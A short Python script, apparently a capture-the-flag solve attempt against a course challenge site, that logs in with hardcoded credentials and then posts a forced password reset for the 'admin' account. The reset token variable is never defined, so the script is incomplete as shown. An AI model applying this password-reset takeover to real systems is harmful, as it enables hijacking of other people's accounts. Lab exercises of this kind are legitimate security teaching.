import requests, sys, base64

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/b5e1020e3742cf2c0880d4098146c4dde25ebd8ceab51807bad88ff47c316eceSecretQuestion"

postData = {"userName":"admin",
            "newPassword":"555555555555",
            "resetPasswordToken":resetToken}

    
response2 = session.post(targetUrl, data=postData)
print(response2.text)


